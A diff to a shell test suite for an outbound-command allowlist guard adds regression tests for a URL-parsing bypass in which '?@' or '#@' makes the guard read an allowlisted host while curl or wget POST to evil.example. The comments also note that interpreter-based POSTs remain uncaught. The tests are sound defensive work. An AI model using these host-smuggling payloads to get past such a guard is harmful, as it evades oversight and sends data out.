@@ -222,6 +222,55 @@ assert_blocked "curl --json= attached"  'curl --json=@b.json https://api.github.
 assert_blocked "curl -K config file"    'curl -K /tmp/post.conf'
 assert_blocked "curl --config file"     'curl --config /tmp/post.conf'
 
+# --- 4d. the authority terminator bypass (INFRA-80) ----------------------
+#
+# The host extractor grabbed `https?://[^ /]+` — a token that stops at `/` and
+# whitespace but NOT at `?` or `#`. RFC 3986 ends the authority at any of `/`,
+# `?`, `#` or end-of-input, so the two missing delimiters fell inside the token,
+# and the userinfo strip (`s/^[^@]*@//`) then turned the exploit's own suffix
+# into a host swap: a real client dials the host BEFORE the delimiter, but the
+# guard read the allowlisted host AFTER a planted `@`.
+#
+# Measured 2026-09-04 (probe in the task report): both curl 8.5.0 and python3
+# urllib resolve `http://evil.example?@plane.homelab` and the `#@` spelling to
+# host=evil.example — the `?`/`#` opens a query/fragment — while the old
+# extractor yielded `plane.homelab`, allowlisted and never contacted. These are
+# payloads fed to a pure inspector; no socket is opened toward evil.example.
+
+assert_blocked "?@ smuggles an allowlisted host past the extractor" \
+    'curl -X POST http://evil.example?@plane.homelab -d x'
+assert_blocked "#@ smuggles an allowlisted host past the extractor" \
+    'curl -X POST http://evil.example#@plane.homelab -d x'
+# The same trick with a bare loopback literal as the planted host, since
+# 127.0.0.1 is on the allowlist too and is the shortest thing to hide behind.
+assert_blocked "?@ smuggles loopback past the extractor" \
+    'curl -X POST http://evil.example?@127.0.0.1 -d x'
+assert_blocked "#@ smuggles loopback past the extractor" \
+    'curl -X POST http://evil.example#@127.0.0.1 -d x'
+# wget takes the same URL shape; the client differs, the parse gap does not.
+assert_blocked "?@ bypass via wget --post-data" \
+    'wget --post-data=x http://evil.example?@plane.homelab'
+
+# NB: the interpreter detour (python/node/…) is NOT asserted here. That branch
+# is scoped to literal github.com and never calls url_targets, so the authority
+# terminator this section fixes does not reach it — a python POST to any
+# non-github host is uncaught with or without this change (pre-existing scope,
+# INFRA-66 §-class, tracked in the INFRA-80 report). Asserting a block there
+# would test a widening this task did not make.
+
+# The fix narrows the token, so it must not have narrowed away a legitimate
+# internal target. A real userinfo prefix in front of an allowlisted host still
+# resolves to that host, and an internal URL that carries a query string now
+# reaches the allowlist instead of dragging `?y=1` into the host token — a shape
+# the old extractor mis-read as outbound and BLOCKED (a latent false refusal
+# this change also fixes).
+assert_allowed "real userinfo in front of an allowlisted host" \
+    'curl -X POST http://user@plane.homelab/api/v1/thing -d x'
+assert_allowed "internal POST carrying a query string" \
+    'curl -X POST "http://plane.homelab/api/v1/issues/?expand=state" -d @b.json'
+assert_allowed "internal GET carrying a fragment" \
+    'curl -sS http://plane.homelab/docs/page#section'
+
 # --- 4c. the internal paths must stay open -------------------------------
 #
 # The inversion is only correct if it does not break the daily loop. A gate
